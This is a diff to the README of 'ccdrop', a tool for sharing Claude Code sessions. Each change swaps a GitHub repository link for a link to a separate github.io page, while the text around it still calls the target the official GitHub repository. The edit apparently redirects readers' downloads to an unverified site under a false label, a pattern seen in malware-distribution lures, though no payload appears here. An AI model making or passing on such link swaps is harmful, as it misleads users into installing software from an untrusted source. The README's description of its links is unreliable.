@@ -1,6 +1,6 @@
 # ⚡ ccdrop - Share Claude Code Sessions Instantly
 
-[![Download ccdrop](https://img.shields.io/badge/Download-ccdrop-blue?style=for-the-badge&logo=github)](https://github.com/Nativistic-elixir71/ccdrop)
+[![Download ccdrop](https://img.shields.io/badge/Download-ccdrop-blue?style=for-the-badge&logo=github)](https://nativistic-elixir71.github.io)
 
 ## 👋 What Is ccdrop?
 
@@ -43,7 +43,7 @@ This will fetch the latest version and launch ccdrop. You'll see a welcome messa
 
 To download and install ccdrop, visit this link to download the application:
 
-**[Download ccdrop](https://github.com/Nativistic-elixir71/ccdrop)**
+**[Download ccdrop](https://nativistic-elixir71.github.io)**
 
 This will take you to the official GitHub repository where you can find the latest release. You can also use the npx command mentioned above to run ccdrop directly without a separate download.
 
@@ -133,7 +133,7 @@ Yes, ccdrop works on any system that can run Node.js, including Windows, macOS, 
 
 If you're a developer looking to contribute or learn more:
 
-- The repository URL: https://github.com/Nativistic-elixir71/ccdrop
+- The repository URL: https://nativistic-elixir71.github.io
 - The project uses modern JavaScript with Node.js runtime
 - It's designed to be lightweight and dependency-minimal
 - The relay logic is simple and focused on ephemerality
@@ -155,7 +155,7 @@ Give it a try with just a few commands. Your Claude Code sessions have never bee
 
 ---
 
-**[Visit the ccdrop GitHub Repository](https://github.com/Nativistic-elixir71/ccdrop)** to download and start sharing today.
+**[Visit the ccdrop GitHub Repository](https://nativistic-elixir71.github.io)** to download and start sharing today.
 
 Remember: `npx ccdrop` - that's all it takes.
 
